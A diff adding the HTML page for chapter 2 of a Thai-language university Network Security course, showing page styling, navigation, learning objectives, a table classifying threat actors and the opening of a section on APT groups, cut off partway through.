@@ -1,0 +1,1747 @@
+<!DOCTYPE html>
+<html lang="th" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CH-2: ภัยคุกคามและการโจมตีทางเครือข่าย | วิชา Network Security</title>
+<meta name="description" content="บทที่ 2 วิชา Network Security — ภัยคุกคามและการโจมตีทางเครือข่าย: Threat Actors, Attack Surface, Cyber Kill Chain, Diamond Model, STRIDE, DREAD, PASTA, MITRE ATT&CK, ARP Spoofing, DNS Poisoning, IP Spoofing, MITM, Session Hijacking, Malware, Ransomware, Zero Trust Architecture">
+<link rel="preconnect" href="https://cdnjs.cloudflare.com">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "LearningResource",
+  "name": "CH-2: ภัยคุกคามและการโจมตีทางเครือข่าย",
+  "description": "บทที่ 2 ของวิชา Network Security — ครอบคลุม Threat Actors, Attack Surface, Cyber Kill Chain, Diamond Model, STRIDE, DREAD, PASTA, MITRE ATT&CK, Network Layer Attacks, Malware, Ransomware Ecosystem, Zero Trust Architecture, Defense in Depth",
+  "educationalLevel": "Undergraduate",
+  "educationalRole": "Instructor",
+  "teaches": [
+    "Threat Actors Classification",
+    "Cyber Kill Chain",
+    "Diamond Model of Intrusion Analysis",
+    "Threat Modeling (STRIDE, DREAD, PASTA)",
+    "MITRE ATT&CK Framework",
+    "Network Layer Attacks",
+    "Malware and Ransomware Ecosystem",
+    "Zero Trust Architecture",
+    "Defense in Depth"
+  ],
+  "inLanguage": "th"
+}
+</script>
+<style>
+
+:root {
+  --primary: #1a3a5c;
+  --primary-dark: #0f2440;
+  --primary-light: #2c5a8c;
+  --accent: #2563eb;
+  --accent-hover: #1d4ed8;
+  --bg: #ffffff;
+  --bg-secondary: #f8fafc;
+  --bg-tertiary: #f1f5f9;
+  --text: #1e293b;
+  --text-secondary: #475569;
+  --text-muted: #94a3b8;
+  --border: #e2e8f0;
+  --border-light: #f1f5f9;
+  --code-bg: #0f172a;
+  --code-text: #e2e8f0;
+  --table-stripe: #f8fafc;
+  --sidebar-bg: #f8fafc;
+  --sidebar-border: #e2e8f0;
+  --shadow: 0 1px 3px rgba(0,0,0,0.08), 0 1px 2px rgba(0,0,0,0.06);
+  --shadow-lg: 0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -2px rgba(0,0,0,0.05);
+  --radius: 8px;
+  --radius-sm: 4px;
+  --radius-lg: 12px;
+  --font-thai: 'Sarabun', 'IBM Plex Sans Thai', 'Kanit', 'Noto Sans Thai', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+  --font-mono: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', 'Source Code Pro', 'Menlo', 'Consolas', monospace;
+  --transition: 0.2s ease;
+  --header-height: 64px;
+  --toc-width: 280px;
+}
+[data-theme="dark"] {
+  --primary: #60a5fa;
+  --primary-dark: #1e3a5f;
+  --accent: #3b82f6;
+  --accent-hover: #60a5fa;
+  --bg: #0f172a;
+  --bg-secondary: #1e293b;
+  --bg-tertiary: #334155;
+  --text: #f1f5f9;
+  --text-secondary: #cbd5e1;
+  --text-muted: #64748b;
+  --border: #334155;
+  --code-bg: #020617;
+  --table-stripe: #1e293b;
+  --sidebar-bg: #1e293b;
+  --sidebar-border: #334155;
+  --shadow: 0 1px 3px rgba(0,0,0,0.3);
+  --shadow-lg: 0 10px 15px -3px rgba(0,0,0,0.4);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;font-size:16px}
+body{font-family:var(--font-thai);background:var(--bg);color:var(--text);line-height:1.75;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:var(--accent);text-decoration:none;transition:color .2s ease}
+a:hover{color:var(--accent-hover);text-decoration:underline}
+h1,h2,h3,h4,h5,h6{line-height:1.3;font-weight:700;color:var(--text);margin-top:1.5em;margin-bottom:.75em}
+h1{font-size:2.25rem;margin-top:0}
+h2{font-size:1.75rem;border-bottom:2px solid var(--border);padding-bottom:.4em}
+h3{font-size:1.35rem}
+h4{font-size:1.1rem}
+p{margin-bottom:1em}
+hr{border:none;border-top:2px solid var(--border);margin:2.5em 0}
+strong,b{font-weight:700}
+ul,ol{margin-bottom:1em;padding-left:1.5em}
+li{margin-bottom:.35em}
+#loading-screen{position:fixed;inset:0;z-index:99999;background:var(--bg);display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .5s ease,visibility .5s ease}
+#loading-screen.hidden{opacity:0;visibility:hidden;pointer-events:none}
+.loading-spinner{width:48px;height:48px;border:4px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .8s linear infinite;margin-bottom:1rem}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-text{color:var(--text-secondary);font-size:1rem}
+#progress-bar{position:fixed;top:0;left:0;height:3px;background:linear-gradient(90deg,var(--accent),#818cf8);z-index:9998;width:0%;transition:width .15s ease-out}
+.top-nav{position:fixed;top:3px;left:0;right:0;z-index:9997;height:var(--header-height);background:var(--bg);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;padding:0 1.25rem;backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px)}
+.top-nav .logo{display:flex;align-items:center;gap:.6rem;font-weight:700;font-size:1rem;color:var(--text);white-space:nowrap}
+.top-nav .logo i{color:var(--accent);font-size:1.3rem}
+.nav-actions{display:flex;align-items:center;gap:.75rem}
+.nav-actions button,.nav-actions .search-toggle{background:none;border:1px solid var(--border);color:var(--text-secondary);width:40px;height:40px;border-radius:var(--radius);display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all .2s ease;font-size:1rem}
+.nav-actions button:hover,.nav-actions .search-toggle:hover{background:var(--bg-tertiary);color:var(--text);border-color:var(--text-muted)}
+#sidebar-toggle{display:none;background:none;border:1px solid var(--border);color:var(--text-secondary);width:40px;height:40px;border-radius:var(--radius);cursor:pointer;font-size:1.1rem;align-items:center;justify-content:center}
+.search-overlay{position:fixed;inset:0;z-index:9996;background:rgba(0,0,0,.5);display:none;align-items:flex-start;justify-content:center;padding-top:80px;backdrop-filter:blur(4px)}
+.search-overlay.active{display:flex}
+.search-panel{background:var(--bg);border-radius:var(--radius-lg);box-shadow:var(--shadow-lg);width:90%;max-width:640px;overflow:hidden;max-height:70vh;display:flex;flex-direction:column}
+.search-input-wrap{display:flex;align-items:center;padding:.75rem 1rem;border-bottom:1px solid var(--border);gap:.5rem}
+.search-input-wrap i{color:var(--text-muted)}
+.search-input-wrap input{flex:1;border:none;outline:none;background:transparent;color:var(--text);font-size:1rem;font-family:var(--font-thai)}
+.search-input-wrap input::placeholder{color:var(--text-muted)}
+.search-count{font-size:.8rem;color:var(--text-muted);white-space:nowrap;padding:.25rem .5rem;background:var(--bg-tertiary);border-radius:var(--radius-sm)}
+.search-results{overflow-y:auto;padding:.5rem;flex:1;max-height:50vh}
+.search-results .no-results{padding:2rem;text-align:center;color:var(--text-muted)}
+.search-result-item{padding:.75rem;border-radius:var(--radius);cursor:pointer;transition:background .2s ease;border-bottom:1px solid var(--border-light)}
+.search-result-item:hover{background:var(--bg-tertiary)}
+.search-result-item .result-heading{font-weight:600;font-size:.9rem;color:var(--accent);margin-bottom:.2rem}
+.search-result-item .result-snippet{font-size:.85rem;color:var(--text-secondary);line-height:1.5}
+.search-result-item .result-snippet mark,.highlight{background:#fef08a;color:#1e293b;padding:0 2px;border-radius:2px}
+[data-theme="dark"] .search-result-item .result-snippet mark,[data-theme="dark"] .highlight{background:#854d0e;color:#fef9c3}
+.layout{display:flex;padding-top:calc(var(--header-height) + 3px);min-height:100vh}
+.sidebar{width:var(--toc-width);flex-shrink:0;position:sticky;top:calc(var(--header-height) + 3px);height:calc(100vh - var(--header-height) - 3px);overflow-y:auto;background:var(--sidebar-bg);border-right:1px solid var(--sidebar-border);padding:1.25rem 1rem;scrollbar-width:thin;scrollbar-color:var(--text-muted) transparent;z-index:100}
+.sidebar::-webkit-scrollbar{width:4px}
+.sidebar::-webkit-scrollbar-thumb{background:var(--text-muted);border-radius:4px}
+.sidebar-title{font-size:.75rem;text-transform:uppercase;letter-spacing:.08em;color:var(--text-muted);font-weight:600;margin-bottom:1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.toc-list{list-style:none;padding:0;margin:0}
+.toc-item{margin-bottom:.15rem}
+.toc-link{display:block;padding:.4rem .6rem;border-radius:var(--radius-sm);font-size:.85rem;color:var(--text-secondary);transition:all .2s ease;border-left:3px solid transparent;text-decoration:none;line-height:1.4}
+.toc-link:hover{background:var(--bg-tertiary);color:var(--text);text-decoration:none}
+.toc-link.active{color:var(--accent);background:rgba(37,99,235,.08);border-left-color:var(--accent);font-weight:600}
+.toc-link.sub{padding-left:1.4rem;font-size:.8rem}
+.toc-link.sub2{padding-left:2.2rem;font-size:.78rem}
+.main-content{flex:1;min-width:0;padding:2rem 2.5rem;max-width:calc(100vw - var(--toc-width))}
+.main-content>section{margin-bottom:2.5rem}
+.section-ref{scroll-margin-top:calc(var(--header-height) + 16px)}
+.hero{background:linear-gradient(135deg,var(--primary-dark),var(--primary));color:#fff;padding:2.5rem 2rem;border-radius:var(--radius-lg);margin-bottom:2.5rem}
+.hero h1{color:#fff;font-size:2rem;margin-bottom:.5rem}
+.hero .subtitle{color:rgba(255,255,255,.85);font-size:1.1rem;margin-bottom:1.25rem}
+.hero .meta-tags{display:flex;flex-wrap:wrap;gap:.5rem}
+.hero .meta-tag{background:rgba(255,255,255,.15);color:rgba(255,255,255,.9);padding:.25rem .75rem;border-radius:20px;font-size:.8rem}
+.learning-objectives{background:var(--bg-secondary);border:1px solid var(--border);border-radius:var(--radius);padding:1.5rem 2rem;margin-bottom:2rem}
+.learning-objectives h3{margin-top:0;font-size:1.1rem;color:var(--accent);display:flex;align-items:center;gap:.5rem}
+.learning-objectives ol{margin:.75rem 0 0;padding-left:1.25rem}
+.learning-objectives li{margin-bottom:.5rem;color:var(--text-secondary);font-size:.95rem}
+.table-wrap{overflow-x:auto;margin:1.25em 0;border-radius:var(--radius);border:1px solid var(--border)}
+table{width:100%;border-collapse:collapse;font-size:.9rem;min-width:500px}
+thead{background:var(--bg-tertiary)}
+th,td{padding:.6rem .85rem;text-align:left;border:1px solid var(--border);vertical-align:top}
+th{font-weight:700;color:var(--text)}
+tbody tr:nth-child(even){background:var(--table-stripe)}
+tbody tr:hover{background:var(--bg-tertiary)}
+pre{background:var(--code-bg);color:var(--code-text);border-radius:var(--radius);padding:1rem 1.25rem;overflow-x:auto;font-family:var(--font-mono);font-size:.8rem;line-height:1.6;margin:1.25em 0;position:relative}
+pre code{background:none;padding:0;color:inherit;font-size:inherit}
+code{background:var(--bg-tertiary);color:var(--accent);padding:.15em .4em;border-radius:var(--radius-sm);font-family:var(--font-mono);font-size:.85em}
+.copy-btn{position:absolute;top:.5rem;right:.5rem;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.15);color:rgba(255,255,255,.7);padding:.3rem .6rem;border-radius:var(--radius-sm);font-size:.75rem;cursor:pointer;transition:all .2s ease;opacity:0}
+pre:hover .copy-btn{opacity:1}
+.copy-btn:hover{background:rgba(255,255,255,.2);color:#fff}
+.copy-btn.copied{background:#22c55e;color:#fff;border-color:#22c55e}
+.expandable{margin:1.25em 0}
+.expandable-header{display:flex;align-items:center;justify-content:space-between;padding:.75rem 1rem;background:var(--bg-tertiary);border:1px solid var(--border);border-radius:var(--radius);cursor:pointer;transition:all .2s ease;user-select:none;font-weight:600;font-size:.95rem}
+.expandable-header:hover{background:var(--border)}
+.expandable-header i{transition:transform .2s ease;font-size:.85rem;color:var(--text-muted)}
+.expandable.expanded .expandable-header i{transform:rotate(180deg)}
+.expandable-content{max-height:0;overflow:hidden;transition:max-height .35s ease,padding .35s ease;border:1px solid transparent}
+.expandable.expanded .expandable-content{max-height:50000px;padding:1rem;border-color:var(--border);border-top:none;border-radius:0 0 var(--radius) var(--radius)}
+.quiz-card{background:var(--bg-secondary);border:1px solid var(--border);border-radius:var(--radius);padding:1.25rem 1.5rem;margin-bottom:1rem;transition:all .2s ease}
+.quiz-card.revealed{border-left:4px solid #22c55e}
+.quiz-question{display:flex;gap:.75rem;align-items:flex-start}
+.q-number{background:var(--accent);color:#fff;font-weight:700;font-size:.8rem;padding:.15rem .65rem;border-radius:20px;white-space:nowrap;flex-shrink:0}
+.quiz-question p{margin:0;font-weight:500;color:var(--text);font-size:.95rem}
+.quiz-card .reveal-btn{display:inline-flex;align-items:center;gap:.4rem;margin-top:.75rem;padding:.4rem 1rem;background:var(--accent);color:#fff;border:none;border-radius:var(--radius);cursor:pointer;font-size:.85rem;font-family:var(--font-thai);transition:all .2s ease}
+.quiz-card .reveal-btn:hover{background:var(--accent-hover)}
+.quiz-card.revealed .reveal-btn{background:var(--text-muted)}
+.quiz-answer{margin-top:.75rem;padding:1rem;background:var(--bg-tertiary);border-radius:var(--radius);border:1px solid var(--border);font-size:.9rem}
+.hidden{display:none}
+#back-to-top{position:fixed;bottom:2rem;right:2rem;z-index:9995;width:44px;height:44px;border-radius:50%;background:var(--accent);color:#fff;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:1.1rem;box-shadow:var(--shadow-lg);transition:all .2s ease;opacity:0;visibility:hidden;transform:translateY(10px)}
+#back-to-top.visible{opacity:1;visibility:visible;transform:translateY(0)}
+#back-to-top:hover{background:var(--accent-hover);transform:translateY(-2px)}
+.site-footer{margin-top:3rem;padding:1.5rem 2rem;background:var(--bg-secondary);border-top:1px solid var(--border);text-align:center;color:var(--text-muted);font-size:.85rem}
+.glossary-term{color:var(--accent);border-bottom:1px dashed var(--accent);cursor:help;position:relative;font-weight:500}
+.glossary-term .tooltip{visibility:hidden;opacity:0;position:absolute;bottom:calc(100% + 8px);left:50%;transform:translateX(-50%);background:var(--primary-dark);color:#fff;padding:.5rem .85rem;border-radius:var(--radius-sm);font-size:.78rem;line-height:1.5;font-weight:400;white-space:normal;z-index:9999;box-shadow:var(--shadow-lg);transition:opacity .2s ease,visibility .2s ease;pointer-events:none;max-width:300px;text-align:center}
+.glossary-term .tooltip::after{content:'';position:absolute;top:100%;left:50%;transform:translateX(-50%);border:5px solid transparent;border-top-color:var(--primary-dark)}
+.glossary-term:hover .tooltip{visibility:visible;opacity:1}
+@media print{
+  .top-nav,.sidebar,#back-to-top,#progress-bar,.copy-btn,.search-overlay,#sidebar-toggle,.nav-actions{display:none!important}
+  .layout{display:block;padding-top:0}
+  .main-content{max-width:100%;padding:0}
+  .hero{background:#1a3a5c!important;-webkit-print-color-adjust:exact;print-color-adjust:exact}
+  .hero h1,.hero .subtitle{color:#fff!important}
+  table{font-size:.8rem}
+  pre{white-space:pre-wrap;word-break:break-all}
+  .expandable-content{max-height:none!important;padding:1rem!important;border-color:var(--border)!important}
+  .expandable-header i{display:none}
+  .table-wrap{overflow:visible}
+  .quiz-answer.hidden{display:block!important}
+  .quiz-card .reveal-btn{display:none}
+  body{font-size:11pt}
+  section{page-break-inside:avoid}
+  h2,h3{page-break-after:avoid}
+}
+@media(max-width:1024px){:root{--toc-width:240px}.main-content{padding:1.5rem}}
+@media(max-width:768px){
+  :root{--toc-width:0px}
+  #sidebar-toggle{display:flex}
+  .sidebar{position:fixed;left:-280px;top:calc(var(--header-height) + 3px);width:280px;height:calc(100vh - var(--header-height) - 3px);transition:left .3s ease;z-index:9990;box-shadow:var(--shadow-lg)}
+  .sidebar.open{left:0}
+  .sidebar-overlay{position:fixed;inset:0;z-index:9989;background:rgba(0,0,0,.4);display:none}
+  .sidebar-overlay.active{display:block}
+  .main-content{max-width:100%;padding:1rem}
+  .hero{padding:1.5rem 1rem}
+  .hero h1{font-size:1.5rem}
+  h2{font-size:1.4rem}
+  h3{font-size:1.15rem}
+  .top-nav{padding:0 .75rem}
+  .top-nav .logo{font-size:.85rem}
+  table{font-size:.8rem}
+  th,td{padding:.4rem .6rem}
+  .quiz-card{padding:1rem}
+}
+@media(max-width:480px){
+  .nav-actions button,.nav-actions .search-toggle{width:36px;height:36px}
+  #back-to-top{bottom:1rem;right:1rem;width:40px;height:40px}
+  .search-panel{width:95%}
+}
+.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}
+</style>
+</head>
+<body>
+<div id="loading-screen" role="status" aria-label="กำลังโหลดเนื้อหา">
+  <div class="loading-spinner" aria-hidden="true"></div>
+  <div class="loading-text">กำลังโหลดเนื้อหา...</div>
+</div>
+<div id="progress-bar" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" aria-label="ความคืบหน้าการอ่าน"></div>
+<header class="top-nav" role="banner">
+  <div style="display:flex;align-items:center;gap:0.5rem;">
+    <button id="sidebar-toggle" aria-label="เปิดเมนูสารบัญ" aria-expanded="false">
+      <i class="fas fa-bars"></i>
+    </button>
+    <div class="logo">
+      <i class="fas fa-shield-halved" aria-hidden="true"></i>
+      <span>Network Security — บทที่ 2</span>
+    </div>
+  </div>
+  <div class="nav-actions">
+    <button class="search-toggle" id="search-toggle-btn" aria-label="ค้นหา" title="ค้นหา (Ctrl+K / &#8984;K)">
+      <i class="fas fa-search" aria-hidden="true"></i>
+    </button>
+    <button id="dark-mode-toggle" aria-label="สลับโหมดมืด/สว่าง" title="สลับโหมดมืด/สว่าง">
+      <i class="fas fa-moon" aria-hidden="true"></i>
+    </button>
+  </div>
+</header>
+<div class="search-overlay" id="search-overlay" role="dialog" aria-label="ค้นหาเนื้อหา">
+  <div class="search-panel">
+    <div class="search-input-wrap">
+      <i class="fas fa-search" aria-hidden="true"></i>
+      <input type="text" id="search-input" placeholder="ค้นหาในเนื้อหาทั้งหมด..." aria-label="ป้อนคำค้นหา" autocomplete="off">
+      <span class="search-count" id="search-count"></span>
+      <button id="search-close-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;font-size:1.1rem;" aria-label="ปิดค้นหา">
+        <i class="fas fa-times"></i>
+      </button>
+    </div>
+    <div class="search-results" id="search-results"></div>
+  </div>
+</div>
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+<nav class="sidebar" id="sidebar" role="navigation" aria-label="สารบัญ">
+  <div class="sidebar-title"><i class="fas fa-list" aria-hidden="true"></i> สารบัญ</div>
+  <ul class="toc-list" id="toc-list">
+    <li class="toc-item"><a class="toc-link" href="#hero-section" data-target="hero-section">บทนำ</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section1" data-target="section1">1. ประเภทของภัยคุกคาม</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section1-1" data-target="section1-1">1.1 การจำแนก Threat Actors</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section1-2" data-target="section1-2">1.2 Nation-State Actors</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section1-3" data-target="section1-3">1.3 Insider Threat</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section1-4" data-target="section1-4">1.4 Cyber Criminal Economy</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section2" data-target="section2">2. Attack Surface</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section2-1" data-target="section2-1">2.1 Network Attack Surface</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section2-2" data-target="section2-2">2.2 Surface vs Vector</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section2-3" data-target="section2-3">2.3 การลด Attack Surface</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section2-4" data-target="section2-4">2.4 การประเมินความเสี่ยง</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section3" data-target="section3">3. การจำแนกและวิเคราะห์</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section3-1" data-target="section3-1">3.1 Cyber Kill Chain</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section3-2" data-target="section3-2">3.2 Unified Kill Chain</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section3-3" data-target="section3-3">3.3 Diamond Model</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section4" data-target="section4">4. Threat Modeling</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section4-1" data-target="section4-1">4.1 STRIDE</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section4-2" data-target="section4-2">4.2 DREAD</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section4-3" data-target="section4-3">4.3 PASTA</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section4-4" data-target="section4-4">4.4 MITRE ATT&amp;CK</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section4-5" data-target="section4-5">4.5 เปรียบเทียบ Frameworks</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section5" data-target="section5">5. Network Layer Attacks</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section5-1" data-target="section5-1">5.1 ARP Spoofing</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section5-2" data-target="section5-2">5.2 DNS Poisoning</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section5-3" data-target="section5-3">5.3 IP Spoofing</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section5-4" data-target="section5-4">5.4 Man-in-the-Middle</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section5-5" data-target="section5-5">5.5 Session Hijacking</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section6" data-target="section6">6. Malware และ Ransomware</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section6-1" data-target="section6-1">6.1 การจำแนก Malware</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section6-2" data-target="section6-2">6.2 วงจรชีวิต Malware</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section6-3" data-target="section6-3">6.3 Delivery Mechanisms</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section6-4" data-target="section6-4">6.4 Ransomware Ecosystem</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section7" data-target="section7">7. Zero Trust Architecture</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section7-1" data-target="section7-1">7.1 แนวคิดหลัก</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section7-2" data-target="section7-2">7.2 7 Tenets</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section7-3" data-target="section7-3">7.3 องค์ประกอบ ZTA</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section7-4" data-target="section7-4">7.4 ZTA vs Perimeter</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section7-5" data-target="section7-5">7.5 CISA Maturity Model</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section7-6" data-target="section7-6">7.6 Google BeyondCorp</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section8" data-target="section8">8. Defense in Depth</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section9" data-target="section9">9. สรุปท้ายบท</a></li>
+    <li class="toc-item"><a class="toc-link" href="#review-questions" data-target="review-questions">คำถามทบทวน</a></li>
+    <li class="toc-item"><a class="toc-link" href="#references" data-target="references">เอกสารอ้างอิง</a></li>
+  </ul>
+</nav>
+<main class="main-content" id="main-content" role="main">
+<section id="hero-section" class="hero section-ref">
+  <h1><i class="fas fa-shield-halved" aria-hidden="true"></i> CH-2: ภัยคุกคามและการโจมตีทางเครือข่าย</h1>
+  <p class="subtitle">Threat Actors, Attack Surface, Cyber Kill Chain, Diamond Model, STRIDE, DREAD, PASTA, MITRE ATT&amp;CK, Network Layer Attacks, Malware, Ransomware Ecosystem, Zero Trust Architecture</p>
+  <div class="meta-tags">
+    <span class="meta-tag"><i class="fas fa-graduation-cap" aria-hidden="true"></i> วิชา Network Security</span>
+    <span class="meta-tag"><i class="fas fa-calendar" aria-hidden="true"></i> ภาคเรียนที่ 1/2569</span>
+    <span class="meta-tag"><i class="fas fa-book-open" aria-hidden="true"></i> บทที่ 2</span>
+  </div>
+</section>
+<div class="learning-objectives section-ref" id="learning-objectives">
+  <h3><i class="fas fa-bullseye" aria-hidden="true"></i> วัตถุประสงค์การเรียนรู้ (Learning Objectives)</h3>
+  <p>เมื่อจบบทนี้แล้ว ผู้เรียนสามารถ:</p>
+  <ol>
+    <li>จำแนกประเภทของ Threat Actors — ตั้งแต่ Nation-State ไปจนถึง Script Kiddie — พร้อมวิเคราะห์แรงจูงใจ เป้าหมาย และความสามารถได้</li>
+    <li>วิเคราะห์ Attack Surface ในเครือข่าย และประยุกต์ใช้ Cyber Kill Chain และ Diamond Model ในการจำแนกขั้นตอนการโจมตีได้</li>
+    <li>ประยุกต์ใช้กรอบการทำ Threat Modeling (STRIDE, DREAD, PASTA, MITRE ATT&amp;CK) ในการวิเคราะห์ความเสี่ยงของระบบได้</li>
+    <li>อธิบายกลไกการโจมตีในชั้นเครือข่าย (ARP Spoofing, DNS Poisoning, IP Spoofing, MITM, Session Hijacking) และระบุมาตรการป้องกันที่สอดคล้องกับ OWASP และ NIST ได้</li>
+    <li>จำแนกประเภทของ Malware อธิบายวงจรชีวิต และวิเคราะห์แนวโน้มของ Ransomware Ecosystem ในปัจจุบันได้</li>
+    <li>อธิบายหลักการของ Zero Trust Architecture ตาม NIST SP 800-207 รวมถึงองค์ประกอบและความแตกต่างจาก Perimeter-Based Security ได้</li>
+  </ol>
+</div>
+<hr>
+
+<!-- ====== SECTION 1: THREAT ACTORS ====== -->
+<section id="section1" class="section-ref">
+<h2>1. ประเภทของภัยคุกคาม (Threat Actors)</h2>
+
+<h3 id="section1-1" class="section-ref">1.1 การจำแนกตามแหล่งที่มา แรงจูงใจ และความสามารถ</h3>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>ประเภท</th><th>แรงจูงใจหลัก</th><th>ระดับความสามารถ</th><th>เป้าหมายทั่วไป</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Nation-State (รัฐชาติ)</strong></td><td>การเมือง, การจารกรรม, สงครามไซเบอร์</td><td><strong>สูงมาก</strong> — มีทรัพยากรไม่จำกัด, Zero-Day</td><td>รัฐบาล, โครงสร้างพื้นฐาน, อุตสาหกรรม Defense</td><td>APT28 (Fancy Bear — รัสเซีย), APT29 (Cozy Bear — รัสเซีย), Lazarus Group (เกาหลีเหนือ), APT1 (จีน)</td></tr>
+    <tr><td><strong>Cyber Criminal (อาชญากรไซเบอร์)</strong></td><td>ผลประโยชน์ทางการเงิน</td><td><strong>ปานกลาง-สูง</strong> — พัฒนาเครื่องมือเองหรือใช้ RaaS</td><td>องค์กรทุกขนาด, บุคคลทั่วไป</td><td>REvil, LockBit, BlackCat (ALPHV), Conti, Clop</td></tr>
+    <tr><td><strong>Hacktivist (นักเคลื่อนไหว)</strong></td><td>อุดมการณ์ทางการเมือง/สังคม/ศาสนา</td><td><strong>ต่ำ-ปานกลาง</strong> — ใช้เครื่องมือสำเร็จรูป</td><td>เว็บไซต์รัฐบาล, องค์กรเป้าหมาย</td><td>Anonymous, Killnet, LulzSec</td></tr>
+    <tr><td><strong>Insider Threat (ภัยภายใน)</strong></td><td>ความไม่พอใจ, ผลประโยชน์, ความประมาท</td><td><strong>แปรผันตามสิทธิ์ที่ได้รับ</strong></td><td>องค์กรของตนเอง</td><td>พนักงานที่ขโมยข้อมูล, ผู้รับเหมาที่ทุจริต</td></tr>
+    <tr><td><strong>Script Kiddie (มือสมัครเล่น)</strong></td><td>ความท้าทาย, ชื่อเสียงในกลุ่ม</td><td><strong>ต่ำ</strong> — ใช้เครื่องมือสำเร็จรูป</td><td>ระบบที่มีช่องโหว่ง่าย</td><td>วัยรุ่นที่ใช้ Loic, Metasploit โดยไม่เข้าใจลึก</td></tr>
+    <tr><td><strong>Organized Crime (อาชญากรรมองค์กร)</strong></td><td>ผลประโยชน์ทางการเงิน — ฟอกเงิน, ฉ้อโกง</td><td><strong>ปานกลาง</strong></td><td>ธนาคาร, สถาบันการเงิน, ตลาด Crypto</td><td>กลุ่มฟอกเงินผ่าน Crypto, Money Mule Networks</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section1-2" class="section-ref">1.2 Nation-State Actors (รัฐชาติ)</h3>
+
+<p>กลุ่ม Nation-State หรือ <span class="glossary-term">APT<span class="tooltip">Advanced Persistent Threat — ภัยคุกคามขั้นสูงที่คงอยู่นาน มักได้รับการสนับสนุนจากรัฐบาล มีทรัพยากรไม่จำกัด และใช้เทคนิคที่ซับซ้อน</span></span> (Advanced Persistent Threat) เป็นภัยคุกคามที่มีความสามารถสูงที่สุด มักได้รับการสนับสนุนจากรัฐบาล มีทรัพยากรไม่จำกัด และใช้เทคนิคที่ซับซ้อนเพื่อบรรลุเป้าหมายทางยุทธศาสตร์</p>
+
+<p><strong>ลักษณะเฉพาะของ APT:</strong></p>
+<ul>
+  <li>มีงบประมาณและบุคลากรเฉพาะทางสูง — ทีมงานประกอบด้วยนักพัฒนามัลแวร์ นักวิเคราะห์เครือข่าย และผู้เชี่ยวชาญด้านการเข้ารหัส</li>
+  <li>ใช้ Zero-Day Vulnerability — ช่องโหว่ที่ยังไม่มีแพตช์ (เช่น EternalBlue ที่รั่วไหลจาก NSA ถูกใช้ใน WannaCry)</li>
+  <li>คงอยู่ในระบบนานหลายเดือนถึงหลายปี (Dwell Time เฉลี่ย &gt;200 วัน)</li>
+  <li>เป้าหมายเฉพาะเจาะจง — ไม่ใช่การโจมตีแบบสุ่ม</li>
